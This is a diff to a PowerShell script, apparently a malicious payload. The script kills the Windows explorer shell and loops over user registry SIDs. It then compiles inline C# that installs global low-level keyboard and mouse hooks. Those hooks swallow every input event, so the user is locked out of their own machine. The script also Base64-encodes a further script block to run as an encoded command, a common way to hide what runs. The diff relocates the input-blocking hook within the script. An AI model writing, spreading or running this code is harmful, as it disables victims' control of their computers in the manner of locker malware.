@@ -10,7 +10,7 @@ $scriptBlock10={
             #execute to user
             Stop-Process -f -ProcessName explorer
             #execute stuff for the background
-            Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();
+            #Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();
             #execute stuff for the background
             $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
             # Loop through each SID and perform an action (for example, display the SID name)
@@ -58,6 +58,7 @@ $scriptBlock10={
                 Write-Output "already effective"
                 }
             }
+            Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class H{static IntPtr h,m;static L k,l;delegate IntPtr L(int n,IntPtr w,IntPtr p);public static void S(){k=K;l=K;h=SetWindowsHookEx(14,k,IntPtr.Zero,0);m=SetWindowsHookEx(13,l,IntPtr.Zero,0);}public static void U(){UnhookWindowsHookEx(h);UnhookWindowsHookEx(m);}static IntPtr K(int n,IntPtr w,IntPtr p){return (IntPtr)1;}[DllImport(`"user32.dll`")]static extern IntPtr SetWindowsHookEx(int i,L d,IntPtr m,uint t);[DllImport(`"user32.dll`")]static extern bool UnhookWindowsHookEx(IntPtr h);}";[H]::S();
         }
         #god do
         $encodedCommand2= [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock1.ToString()))
